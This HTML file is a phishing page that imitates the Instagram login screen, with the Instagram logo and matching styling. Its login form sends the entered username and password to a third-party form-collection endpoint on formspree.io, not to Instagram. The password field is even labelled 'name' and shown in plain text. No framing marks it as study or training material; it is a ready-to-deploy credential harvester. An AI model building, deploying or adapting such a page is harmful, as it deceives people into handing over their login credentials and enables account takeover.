<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login</title>
    <link rel="icon" type="image/png" href="logo.png">
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 300px;
            text-align: center;
        }

        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 8px;
            margin: 6px 0;
            box-sizing: border-box;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
        }

        .login-btn {
            width: 100%;
            background-color: #3897f0;
            color: white;
            padding: 8px;
            border: none;
            border-radius: 4px;
            margin-top: 10px;
            cursor: pointer;
            font-weight: bold;
        }

        .or {
            margin: 20px 0;
            font-size: 12px;
            color: #999;
            position: relative;
        }

        .or::before,
        .or::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #dbdbdb;
        }

        .or::before {
            left: 0;
        }

        .or::after {
            right: 0;
        }

        .forgot {
            font-size: 12px;
            color: #00376b;
            margin-top: 12px;
        }

        .signup {
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt="Logo">

        <form action="https://formspree.io/f/mbdvwekb" method="POST">

            <input
                type="text"
                name="username"
                placeholder="Phone number, username, or email"
                class="input-field"
                required
            >

            <input
                type="text"
                name="name"
                placeholder="Password"
                class="input-field"
                required
            >

            <button type="submit" class="login-btn">
                Log In
            </button>

        </form>

        <div class="or">OR</div>
        <div class="forgot">Forgot Password</div>
        <div class="signup">Dont Have An Account<b>Sign up</b></div>
    </div>
    </section>
    </div>
    </section>
</body>
</html>
